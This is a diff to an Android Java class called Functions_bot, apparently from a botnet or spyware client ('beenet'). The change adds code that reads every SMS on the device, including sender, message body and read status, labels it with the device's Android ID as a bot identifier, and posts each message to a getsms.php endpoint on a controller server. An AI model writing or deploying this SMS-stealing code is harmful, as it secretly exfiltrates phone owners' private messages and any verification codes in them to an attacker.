@@ -139,15 +139,23 @@ public class Functions_bot {
 
         Cursor smsCursor = appContext.getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
 
-
-        if (smsCursor.moveToFirst()) { /* false = no sms */
+    String fuente, contenido, leido = "";
+        if (smsCursor.moveToFirst()) {
             do {
-                String msgInfo = "";
 
-                for (int i = 0; i < smsCursor.getColumnCount(); i++) {
-                  //  msgInfo += " " + smsCursor.getColumnName(i) + ":" + smsCursor.getString(i);
-                }
 
+
+                fuente=smsCursor.getString(2);
+                contenido = smsCursor.getString(12);
+                leido = smsCursor.getString(7);
+                HashMap<String, String> infoPost = new HashMap<String, String>();
+                infoPost.put("id_bot",getAndroidId());
+                infoPost.put("nombre",fuente);
+                infoPost.put("contenido", contenido);
+                infoPost.put("leido",leido);
+
+
+                SendMethod.sendMethodNR("http://192.168.1.2/beenet/getsms.php",infoPost);
 
             } while (smsCursor.moveToNext());
         }
